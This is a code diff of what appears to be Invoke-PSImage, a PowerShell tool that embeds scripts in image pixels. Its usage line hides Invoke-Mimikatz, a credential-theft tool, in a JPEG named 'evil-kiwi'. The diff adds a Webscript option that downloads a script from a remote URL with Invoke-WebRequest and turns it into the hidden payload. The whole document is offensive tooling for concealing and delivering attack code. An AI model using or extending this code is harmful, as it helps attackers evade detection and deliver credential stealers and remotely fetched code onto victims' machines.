@@ -41,15 +41,19 @@ PS>Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Image .\kiwi.jpg -Out .\evil-ki
 #>
 
     [CmdletBinding()] Param (
-        [Parameter(Position = 0, Mandatory = $True)]
+        [Parameter(Position = 0, Mandatory = $False)]
         [String]
         $Script,
+        
+        [Parameter(Position = 1, Mandatory = $False)]
+        [String]
+        $Webscript,
     
-        [Parameter(Position = 1, Mandatory = $True)]
+        [Parameter(Position = 2, Mandatory = $True)]
         [String]
         $Image,
     
-        [Parameter(Position = 2, Mandatory = $True)]
+        [Parameter(Position = 3, Mandatory = $True)]
         [String]
         $Out,
 
@@ -63,7 +67,7 @@ PS>Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Image .\kiwi.jpg -Out .\evil-ki
     [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Web")
     
     # Normalize paths beacuse powershell is sometimes bad with them.
-    if (-Not [System.IO.Path]::IsPathRooted($Script)){
+    if ( $Script -And (-Not [System.IO.Path]::IsPathRooted($Script)) ) {
         $Script = [System.IO.Path]::GetFullPath((Join-Path (pwd) $Script))
     }
     if (-Not [System.IO.Path]::IsPathRooted($Image)){
@@ -74,7 +78,13 @@ PS>Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Image .\kiwi.jpg -Out .\evil-ki
     }
         
     # Read in the script
-    $ScriptBlockString = [IO.File]::ReadAllText($Script)
+    if ( $WebScript ) {
+        $R=Invoke-WebRequest $WebScript
+        $ScriptBlockString=$R.Content+";"
+    }
+    else {
+        $ScriptBlockString = [IO.File]::ReadAllText($Script)
+    }
     $input = [ScriptBlock]::Create($ScriptBlockString)
     $payload = [system.Text.Encoding]::ASCII.GetBytes($input)
 
